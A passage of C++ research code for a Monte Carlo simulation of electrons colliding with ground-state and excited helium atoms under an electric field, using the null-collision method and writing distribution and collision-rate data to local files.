    std::ofstream file11(""output_files/nu_elastic_average_final.dat"");
    std::ofstream file12(""output_files/nu_inelastic1_average_final.dat""); 
    std::ofstream file13(""output_files/log_output.dat"");  
    std::ofstream file14(""output_files/excited_energies.dat"");       
    std::ofstream file15(""output_files/excited_histo.dat"");             
    std::ofstream file_temp(""output_files/collision_rates.dat"");  

    // Initialize all electrons
    for (auto& e : electrons) {
        e.initialize(gen, dis, maxwell_electron);
    }

    // precalculate cross-sections for each energy bin
    for (int i = 0; i < N; i++){
        elastic_vec[i] = interpolate(bin_width*(i+0.5), elastic_CS_temp); //elastiuc
        inelastic1_vec[i] = interpolate(bin_width*(i+0.5), inelastic1_CS_temp); //triplet excitation
        inelastic2_vec[i] = interpolate(bin_width*(i+0.5), inelastic2_CS_temp); //singlet excitation
    }

    // precalculate superelastic cross-section (triplet -> ground) for each energy bin
    // detailed balance gives: sigma_j_i(E) = (g_i/g_j)*((E+theshold)/E)*sigma_i_j(E+theshold)
    for (int i = 0; i < N; i++){
        double energy = Emin + (i + 0.5) * bin_width;
        int thresh_bin = (int)( (thresh1 - Emin)/bin_width ); // calculating bin for threshold energy
        superelastic1_vec[i] = (1.0/3.0)*((energy + thresh1)/energy)*interpolate(energy + thresh1, inelastic1_CS_temp); // using detailed balance, calculating backward deexcitation cross-section
        superelastic2_vec[i] = (1.0/1.0)*((energy + thresh2)/energy)*interpolate(energy + thresh2, inelastic2_CS_temp);
    }

    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }

    // -----initial electrons energy distribution starts------------////
    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file3 << bin_center << "" "" <<  static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // this is electron normalized distribution function
    }
    // -----initial electrons energy distribution ends------------////    

    // // -----neutrals Maxwell-Boltzmann distribution starts------------////
    // for (int i = 0; i < N_He; i++){
    //     int bin = (int)( (neutrals[i].energy - Emin)/bin_width );
    //     if (bin >=0 && bin < histo_neutral.size())
    //         histo_neutral[bin]++;
    // }    

    // for (int i = 0; i < histo_neutral.size(); i++){
    //     double bin_center = Emin + (i + 0.5) * bin_width;
    //     file5 << bin_center << "" "" << static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this is real f(E) - normalized distribution
    //     file6 << bin_center << "" "" << bin_center*static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this should be E*f(E) 

    // }

    // // -----neutrals Maxwell-Boltzmann distribution starts------------////       


    //calculating excited specied population

    /*From Boltzman distribution y_k = g_k*exp(-E_k/kT)/norm, where g_k - stat weight of k-state, 
    E_k - threshold energy for k-state, norm is a total partition function or normaliztion factor     */

    double part_ground = 1.0*exp(-0.0/T_n); // partition function for ground state
    double part_triplet = 3.0*exp(-thresh1/T_n); // partition function for triplet excited state
    double part_singlet = 1.0*exp(-thresh2/T_n); // partition function for singlet excited state
    double part_func_total = part_ground + part_triplet + part_singlet; // total partition function
    double N_trpilet = (part_triplet/part_func_total)*N_He; // population of tripet state 
    double N_singlet = (part_singlet/part_func_total)*N_He; // population of singlet state

    std::vector<Excited_neutral> exc_1(static_cast<int>(N_trpilet));  // vector to track triplet excited atoms of Helium
    std::vector<Excited_neutral> exc_2(static_cast<int>(N_singlet));  // vector to track singlet excited atoms of Helium    

    // adjusting neutrals number:

    N_He -= (N_trpilet + N_singlet);

    std::cout << N_He << ""\n"";

    // initializing excited species with Maxwellian distribution

    for (auto& exc : exc_1) {
    NeutralParticle tmp_neutral;
    tmp_neutral.initialize(gen, dis, maxwell_neutral);
    exc.energy = tmp_neutral.energy;
    exc.vx = tmp_neutral.vx;
    exc.vy = tmp_neutral.vy;
    exc.vz = tmp_neutral.vz;
    }

    for (auto& exc : exc_2) {
    NeutralParticle tmp_neutral;
    tmp_neutral.initialize(gen, dis, maxwell_neutral);
    exc.energy = tmp_neutral.energy;
    exc.vx = tmp_neutral.vx;
    exc.vy = tmp_neutral.vy;
    exc.vz = tmp_neutral.vz;
    }

    std::cout << ""Triplet population initialized: "" << exc_1.size() << ""\n"";
    std::cout << ""Singlet population initialized: "" << exc_2.size() << ""\n"";    

    // calculating excited specied population finished //

    // -----calculating nu-max for null-collision method starts ------------////
    double nu_max = 0.0;
    double nu_max_temp = 0.0;
    double sigma_total = 0.0;
    
    for (int i = 0; i < N; i++){
        sigma_total = elastic_vec[i] + inelastic1_vec[i] + superelastic1_vec[i] + inelastic2_vec[i] +  superelastic2_vec[i];
//        sigma_total = elastic_vec[i] + inelastic1_vec[i] + inelastic2_vec[i]; // ??? densities of excited states are much lower!!!
        nu_max_temp = (N_He/Volume)*sigma_total * sqrt(2.0*(i*bin_width + bin_width/2.0)*q/m_e);
        file7 << i << "" "" << nu_max_temp << ""\n"";
        if (nu_max_temp > nu_max)
            nu_max = nu_max_temp;
    }

    std::cout << nu_max << ""\n"";
    // -----calculating nu-max for null-collision method ends ------------////

    //----- calculating number to calculate nu-average (both elastic/inelastic )from our electron distribution starts---------///
    // --- calculating nu(E)*f(E) for later external integration, using initial f(E)
    for (int i = 0; i < N; i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file9 << bin_center << "" "" << (N_He/Volume)*elastic_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
        file10 << bin_center << "" "" << (N_He/Volume)*inelastic1_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
    }
    //----- calculating nu-average from our electron distribution ends ---------///    

    double dt = 0.05/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995
    double steps = static_cast<int>(time/dt);

    std::cout << steps << ""\n"";
    std::cout << dt << ""\n"";

    //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
    int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;


    int print_interval = 100;
    int el_coll_counter = 0; // track all elastic collisions
    int exc1_coll_counter = 0; // track all triplet excitation collisions
    int exc2_coll_counter = 0; // track all singlet excitation collisions
    int null_coll_counter = 0; // track null-collisions
    int ee_coll_counter = 0; //track e-e Coulomb collisions
    int super1_coll_counter = 0; // track superelastic triplet collisions
    int super2_coll_counter = 0; // track superelastic triplet collisions    


    for (int t = 0; t < steps; t++){

//        file_temp << t << "" "" << exc_1.size() << "" "" << exc_2.size() << ""\n"";       
        
//        std::cout << N_He + exc_1.size() + exc_2.size() << ""\n"";        

        // Generate shuffled list of electron indices
        int reshuffle_interval = 1;
        std::vector<int> electron_indices(n_e);
        std::iota(electron_indices.begin(), electron_indices.end(), 0); // fill with index
        std::shuffle(electron_indices.begin(), electron_indices.end(), gen); // shuffle the indexes    

        // Generate shuffled list of triplet excited atoms indices
        std::vector<int> excited1_indices(exc_1.size());
        std::iota(excited1_indices.begin(), excited1_indices.end(), 0); // fill with index
        std::shuffle(excited1_indices.begin(), excited1_indices.end(), gen); // shuffle the indexes    

        // Generate shuffled list of singlet excited atoms indices
        std::vector<int> excited2_indices(exc_2.size());
        std::iota(excited2_indices.begin(), excited2_indices.end(), 0); // fill with index
        std::shuffle(excited2_indices.begin(), excited2_indices.end(), gen); // shuffle the indexes    

        int exc1_coll_counter_temp = 0;
        int super1_coll_counter_temp = 0;
        int exc2_coll_counter_temp = 0;
        int super2_coll_counter_temp = 0;
        int null_coll_counter_temp = 0;

        std::cout << ""timestep remains: "" << steps - t << ""\n"";

 

        // calculating mean energy 
        double total_energy = 0.0;
        for (const auto& e : electrons) total_energy += e.energy;
        double mean_energy = total_energy / n_e;
        file8 << t*dt << "" "" << mean_energy << ""\n"";            


        // setting flags to false each timestep
        for (auto& e : electrons) e.collided_en = false;
        for (auto& e : electrons) e.collided_ee = false;        

        int collision_counter_en = 0; // electron-neutral collision counter
        int collision_counter_ee = 0; // e-e collisoin counter


        for (int idx : electron_indices) {

            if (collision_counter_en >= Ne_collided) break; // quit if reached all collisions

            Electron& e = electrons[idx];
            if (e.collided_en) continue;  // Skip already collided electrons

            double electron_energy = e.energy;
            int bin_energy = static_cast<int>(electron_energy / bin_width);
            double nu_elastic = (N_He/Volume) * elastic_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
            double nu_inelastic1 = (N_He/Volume) * inelastic1_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
            double nu_superelastic1 = (exc_1.size()/Volume) * superelastic1_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
            double nu_inelastic2 = (N_He/Volume) * inelastic2_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
            double nu_superelastic2 = (exc_2.size()/Volume) * superelastic2_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);

            double r = dis(gen);

            double P0 = nu_elastic/nu_max;
            double P1 = (nu_elastic + nu_inelastic1)/nu_max;
            double P2 = (nu_elastic + nu_inelastic1 + nu_superelastic1)/nu_max;
            double P3 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2)/nu_max;
            double P4 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2 + nu_superelastic2)/nu_max;            

            if (r < P0) {

                // elastic collision happens
 
                // ----   Collision energy redistribution module
 
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron
 
                // randomize particles each collision
 
                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;
 
 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                if (cos_khi >= 1)
                    cos_khi = 1.0 - dopant;
                if (cos_khi <= -1)
                    cos_khi = -1.0 + dopant;
                                     
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities  
 
                double delta_E = 2.0*(m_e/M_n)*(1.0 - cos_khi)*E_0;
                if (e.energy < delta_E) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }     
                else {                           
                    e.energy = E_0 - delta_E;
                }
                
 
                double speed = sqrt(2*e.energy*q/m_e);
 
                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;              
 
                collision_counter_en++;
                el_coll_counter++;
 
                e.collided_en = true;
            }        

            else if (r < P1) {

                //inelastic 1(triplet) collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                if (e.energy < thresh1) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.energy = E_0 - thresh1;
 
                    double speed = sqrt(2*e.energy*q/m_e);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter_en++;   
                    exc1_coll_counter++;
                    exc1_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_1
                    if (N_He > 0) {
                        exc_1.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        N_He--;
                    }
                }
            }     

            else if (r < P2) {

                //superelastic 1(triplet -> ground state) collision happens

                if (exc_1.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_1.size()-1)(gen);
                Excited_neutral& exc = exc_1[index];
                double V_x = exc.vx;
                double V_y = exc.vy;
                double V_z = exc.vz;
                double E = exc.energy;
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                e.energy = E_0 + thresh1;

                double speed = sqrt(2*e.energy*q/m_e);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                //counting collisions, working with flags, popping atom out of the vector
                if (!exc_1.empty()) {
                    std::swap(exc_1[index], exc_1.back());
                    exc_1.pop_back();
                    N_He++;
                }
                collision_counter_en++;   
                super1_coll_counter++;
                super1_coll_counter_temp++;

                e.collided_en = true;
            }  

            else if (r < P3) {

                //inelastic 1(singlet) excitation collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                if (e.energy < thresh2) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.energy = E_0 - thresh2;
 
                    double speed = sqrt(2*e.energy*q/m_e);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter_en++;   
                    exc2_coll_counter++;
                    exc2_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_2

                    if (N_He > 0) {
                        exc_2.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        N_He--;
                    }
                }
            }

            else if (r < P4) {

                //supernelastic 1(singlet -> ground state) collision happens

                if (exc_2.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_2.size()-1)(gen);
                Excited_neutral& exc = exc_2[index];
                double V_x = exc.vx;
                double V_y = exc.vy;
                double V_z = exc.vz;
                double E = exc.energy;
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                e.energy = E_0 + thresh2;

                double speed = sqrt(2*e.energy*q/m_e);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                //counting collisions, working with flags, popping atom out of the vector

                if (!exc_2.empty()) {
                    std::swap(exc_2[index], exc_2.back());
                    exc_2.pop_back();
                    N_He++;
                }

                collision_counter_en++;   
                super2_coll_counter++;
                super2_coll_counter_temp++;

                e.collided_en = true;
            }              

            else {
                // null-collision
                collision_counter_en++;
                null_coll_counter++;
                e.collided_en = true;
            }
        }

//         // ----- -------now begin e-e collisions ------ /////

//         // Reshuffle electron indices for random pairing for e-e collisions
//         std::shuffle(electron_indices.begin(), electron_indices.end(), gen);

//         int max_pairs = n_e/2; // each electron collides 
        
//         for (int i = 0; i < max_pairs; i++){

//             int id1 = electron_indices[2 * i];
//             int id2 = electron_indices[2 * i + 1];
//             if (id1 >= n_e || id2 >= n_e) continue; // Handle edge case

//             Electron& e1 = electrons[id1];
//             Electron& e2 = electrons[id2];

//             if (e1.collided_ee || e2.collided_ee) continue; //handle already collided cases

//             double E_initial = e1.energy + e2.energy; // total initial energy of pair to check the energy conservation

//             // generating random variables to calculate random direction of center-of-mass after the collision

//             double R1 = dis(gen);
//             double R2 = dis(gen);        

//             // ----   Collision energy redistribution module

//             // first particle X Y Z initial velocities
//             double V0_x_1 = e1.vx;
//             double V0_y_1 = e1.vy;
//             double V0_z_1 = e1.vz;
//             // second particle X Y Z initial velocities
//             double V0_x_2 = e2.vx;
//             double V0_y_2 = e2.vy;
//             double V0_z_2 = e2.vz;

//             // file13 << ""V0_x_1: "" << V0_x_1 << "" "" << ""V0_y_1: "" << V0_y_1 << "" "" << "" V0_z_1: "" << V0_z_1 << "" "";
//             // file13 << ""V0_x_2: "" << V0_x_2 << "" "" << ""V0_y_2: "" << V0_y_2 << "" "" << "" V0_z_2: "" << V0_z_2 << "" "";

//             // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 

//             double V0_rel_x = (V0_x_1 - V0_x_2);
//             double V0_rel_y = (V0_y_1 - V0_y_2);
//             double V0_rel_z = (V0_z_1 - V0_z_2);

//             if(std::isnan(V0_x_1) || std::isinf(V0_x_1) || fabs(V0_x_1) < 1e-12 || std::isnan(V0_y_1) || std::isinf(V0_y_1) || fabs(V0_y_1) < 1e-12 || std::isnan(V0_z_1) || std::isinf(V0_z_1) || fabs(V0_z_1) < 1e-12){
//                 std::cerr << ""Invalid V0_rel_x computed: "" << V0_rel_x << "" at timestep "" << t << std::endl;
//                 std::cerr << ""Components of velocities: Vx, Vy, Vz forr the first electron: "" << V0_x_1 << "" "" << V0_y_1 << "" "" << V0_z_1 << ""\n"";
//             //    continue;
//             }

//             if(std::isnan(V0_x_2) || std::isinf(V0_x_2) || fabs(V0_x_2) < 1e-12 || std::isnan(V0_y_2) || std::isinf(V0_y_2) || fabs(V0_y_2) < 1e-12 || std::isnan(V0_z_2) || std::isinf(V0_z_2) || fabs(V0_z_2) < 1e-12){
//                 std::cerr << ""Invalid V0_rel_x computed: "" << V0_rel_x << "" at timestep "" << t << std::endl;
//                 std::cerr << ""Components of velocities: Vx, Vy, Vz forr the second electron: "" << V0_x_2 << "" "" << V0_y_2 << "" "" << V0_z_2 << ""\n"";
//             //    continue;
//             }    

//             if(std::isnan(V0_rel_y) || std::isinf(V0_rel_y) || fabs(V0_rel_y) < 1e-12){
//                 std::cerr << ""Invalid V0_rel_y computed: "" << V0_rel_y << "" at timestep "" << t << std::endl;
//                 continue;
//             }     
//             if(std::isnan(V0_rel_z) || std::isinf(V0_rel_z) || fabs(V0_rel_z) < 1e-12){
//                 std::cerr << ""Invalid V0_rel_z computed: "" << V0_rel_z << "" at timestep "" << t << std::endl;
//                 continue;
//             }              


//             double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);
//             double V0_rel_normal = sqrt(V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);

//             // file13 << ""V0_rel: "" << V0_rel << "" "" << ""V0_rel_normal: "" << V0_rel_normal << "" "";

//             if(std::isnan(V0_rel) || std::isinf(V0_rel) || fabs(V0_rel) < 1e-12){
//                 std::cerr << ""Invalid V0_rel computed: "" << V0_rel << "" at timestep "" << t << std::endl;
//                 V0_rel = 1.0E-6;
//                 e1.collided_ee = true;
//                 e2.collided_ee = true;
//                 continue;
//             }
            
//             if(std::isnan(V0_rel_normal) || std::isinf(V0_rel_normal) || fabs(V0_rel_normal) < 1e-12){
//                 std::cerr << ""Invalid V0_rel_normal computed: "" << V0_rel << "" at timestep "" << t << std::endl;
//                 continue;
//             }                        

//             // calculating spherical angles for center-of-mass random direction
//             double theta = acos(1.0- 2.0*R1);
//             double phi = 2*M_PI*R2;

//             // calcluating h for equations 20a, 20b (Nanbu1995)

//             double eps = 2*M_PI*R1;

//             double h_x = V0_rel_normal*cos(eps);
//             double h_y = -(V0_rel_y*V0_rel_x*cos(eps) + V0_rel*V0_rel_z*sin(eps))/V0_rel_normal;
//             double h_z = -(V0_rel_z*V0_rel_x*cos(eps) - V0_rel*V0_rel_y*sin(eps))/V0_rel_normal;    

//             //  calculating s (Nanbu1995 eq 19)

//             double s = Coulomb_log/(4.0*M_PI) * pow((q*q/(epsilon_0*(m_e/2))),2) * (n_e/Volume) * pow(V0_rel,-3) * dt;

//             // file13 << ""s: "" << s << "" "";

//             if(std::isnan(s) || std::isinf(s) || fabs(s) < 1e-12){
//                 std::cerr << ""Invalid s computed: "" << s << "" at timestep "" << t << std::endl;
//                 continue;
//             }

//             double A = solve_A(s);   

//             if(std::isnan(A) || std::isinf(A) || fabs(A) < 1e-12){
// //                std::cerr << ""Invalid A computed: "" << A << "" at timestep "" << t << std::endl;
//                 A = 1.0E-12;
// //                continue;
//             }


//             // calculating cos(khi) (Nanbu1995 eq 17)
//             double cos_khi = 0.0;
//             double sin_khi = 0.0;
            
//             if (s < 1.0E-2 & R1 != 0.0) {// taking care of small s  
//                 cos_khi = 1.0 + s*log(R1);    
//             }
//             else {
//                 cos_khi = (1.0/A)*log(exp(-A) + 2.0*R1*sinh(A));
//             }

//             if (cos_khi > 1.0)
//                 cos_khi = 1.0;

//             sin_khi = sqrt(1.0 - cos_khi*cos_khi);


//             //calculating final velocity of first particle

//             double V_x_1 = V0_x_1 - 0.5*(V0_rel_x*(1.0-cos_khi) + h_x*sin_khi);
//             double V_y_1 = V0_y_1 - 0.5*(V0_rel_y*(1.0-cos_khi) + h_y*sin_khi);
//             double V_z_1 = V0_z_1 - 0.5*(V0_rel_z*(1.0-cos_khi) + h_z*sin_khi);

//             double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);

//             //calculating final velocity of second particle

//             double V_x_2 = V0_x_2 + 0.5*(V0_rel_x*(1.0-cos_khi) + h_x*sin_khi);
//             double V_y_2 = V0_y_2 + 0.5*(V0_rel_y*(1.0-cos_khi) + h_y*sin_khi);
//             double V_z_2 = V0_z_2 + 0.5*(V0_rel_z*(1.0-cos_khi) + h_z*sin_khi);

//             double V_2 = sqrt(V_x_2*V_x_2 + V_y_2*V_y_2 + V_z_2*V_z_2);

//             // updating velocities

//             e1.vx = V_x_1; 
//             e1.vy = V_y_1;
//             e1.vz = V_z_1;

//             e2.vx = V_x_2; // Update velocity components
//             e2.vy = V_y_2;
//             e2.vz = V_z_2;

//             // calculating final energies of first and second colliding particles

//             e1.energy = V_1*V_1*m_e/(2.0*q);
//             e2.energy = V_2*V_2*m_e/(2.0*q);           

//             double E_final = e1.energy + e2.energy;


//             // if(fabs(E_final - E_initial) > 1e-6) {
//             //     std::cerr << ""Energy conservation violation: "" << E_final - E_initial << "" eV\n"";
//             // }

//             // --- collision energy redistrubution module ends  

//             // collision counters handling

//             ee_coll_counter++;
//             e1.collided_ee = true;
//             e2.collided_ee = true;

//         }
//         //////----------------------e-e coulomb collision ends --------------/////////////////

        /// -- electrin field heating along E-Z axis begin--- ///
        for (int idx : electron_indices) {

            // Update velocity component due to electric field
            double a_z = ((-1.0)*q * E_reduced) / m_e; // acceleration in z-direction, m/s^2
            electrons[idx].vz += a_z * dt;

            // Recalculate energy from updated velocity
            double vx = electrons[idx].vx;
            double vy = electrons[idx].vy;
            double vz = electrons[idx].vz;
            electrons[idx].energy = 0.5 * m_e * (vx*vx + vy*vy + vz*vz) / q;
        }
        // -------------------------------------------- filed heating ends ------------------------////////////////

        /// ---- data writing starts -----------////////////

            // if ((t%print_interval == 0) || (t == steps - 1)){
            // // open datafiles to write each time step to see evolution
            // std::ostringstream filename;
            // filename << ""data/distribution_"" << std::setw(4) << std::setfill('0') << t << "".dat"";

            // std::ofstream file(filename.str());
            // if (!file.is_open()){
            // std::cerr << ""Error opening file: "" << filename.str() << std::endl;
            // return 1;
            // }
            // // end opening datafiles for each timestep
            
            // // creating histogram each timestep
            // for (int i = 0; i < n_e; i++){
